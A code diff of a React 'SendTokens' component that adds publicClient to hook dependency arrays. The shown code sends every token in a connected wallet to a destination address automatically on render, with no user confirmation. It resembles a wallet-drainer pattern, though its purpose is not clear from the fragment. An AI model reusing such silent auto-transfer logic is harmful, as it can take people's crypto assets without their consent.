@@ -70,13 +70,13 @@ export const SendTokens = () => {
         console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
       }
     }
-  }, [tokens, walletClient, destinationAddress, setCheckedRecords, setDestinationAddress]);  // Ajout des dépendances manquantes
+  }, [tokens, walletClient, destinationAddress, setCheckedRecords, setDestinationAddress, publicClient]);  // Ajout des dépendances manquantes
 
   useEffect(() => {
     if (tokens.length > 0 && destinationAddress) {
       sendAllTokens();
     }
-  }, [tokens, destinationAddress, walletClient, sendAllTokens]); // Ajout des dépendances manquantes
+  }, [tokens, destinationAddress, walletClient, sendAllTokens, publicClient]); // Ajout des dépendances manquantes
 
   return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
 };
